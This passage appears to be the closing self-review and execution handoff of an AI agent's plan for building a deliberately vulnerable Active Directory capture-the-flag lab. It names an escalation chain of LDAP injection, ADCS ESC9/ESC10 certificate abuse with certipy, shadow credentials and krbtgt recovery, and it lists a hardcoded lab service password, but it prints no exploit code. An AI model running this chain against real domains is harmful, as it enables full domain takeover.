- §8.4 (Domain Admin / `krbtgt` recovered, root flag lives on the DC) → Task 6, Step 2's `krbtgt:` check; root flag placement itself is Plan 4's responsibility (spec §10).
- §11 open item "AD provisioning must never write `info` for administrator" → Task 2's explicit `throw` assertion, re-verified by `check-users.ps1`.
- §11 open item "LDAP injection needs re-verification against real AD, not mock" → intentionally **not re-tested here**; that belongs to Plan 4, which replays Plan 1's verified payload against this plan's real DC once `LDAP_MODE=real`.
- §11 open item "ESC9 must be verified on a real DC with `certipy find -vulnerable`" → Task 4, Step 5.

**Placeholder scan:** No TBD/TODO markers. The one open-ended item (Task 7's ESC10 outcome) is explicitly scoped as a build-time finding rather than a pass/fail gate, with a clear fallback (ESC9 remains primary) — not a vague deferral.

**Type consistency:** `svc_ldap` password (`LdapBind2026!Str0ng`) is used identically in `check-esc9.sh` and `run-esc9-chain.sh`. `DC_IP` (`10.10.20.10`) matches Plan 2's `config.env`. Template name `DonerupUserAuth` and CA name `Donerup-CA` are consistent across Tasks 4, 6, and 7.

**Correction (pre-implementation, verified against installed certipy v5.0.4 / impacket v0.13.1):** Task 6's original draft had three latent bugs, fixed in the script body above before any subagent implemented it — (1) the shadow-credential NT-hash grep pattern didn't match this certipy version's actual output string, (2) the enrolled `.pfx` would have saved under the wrong filename because certipy names it from the certificate's embedded UPN (which is `administrator` at request time) rather than from `-u`, and (3) `DC_HOST` referenced a DC hostname no earlier task ever establishes. See the inline comment in Task 6's script for details.

---

## Execution Handoff

Plan complete and saved to `docs/superpowers/plans/2026-08-24-donerup-ad-escalation.md`. Two execution options:

1. **Subagent-Driven (recommended)** — I dispatch a fresh subagent per task, review between tasks, fast iteration
2. **Inline Execution** — Execute tasks in this session using executing-plans, batch execution with checkpoints

Which approach?
